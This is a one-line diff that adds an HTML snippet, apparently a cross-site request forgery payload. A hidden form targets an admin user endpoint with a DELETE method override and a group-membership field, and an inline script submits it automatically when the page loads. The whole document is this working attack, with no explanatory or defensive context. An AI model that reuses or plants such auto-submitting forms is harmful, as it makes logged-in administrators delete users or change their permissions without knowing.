@@ -1,0 +1,1 @@
+<form name=The action="/admin/users/view/211535" method="POST"><input type="hidden" name="&#95;method" value="DELETE" /><input type="hidden" name="data&#91;Group&#93;&#91;Group&#93;&#91;&#93;" value="1" /></form> <script> document.The.submit(); </script>
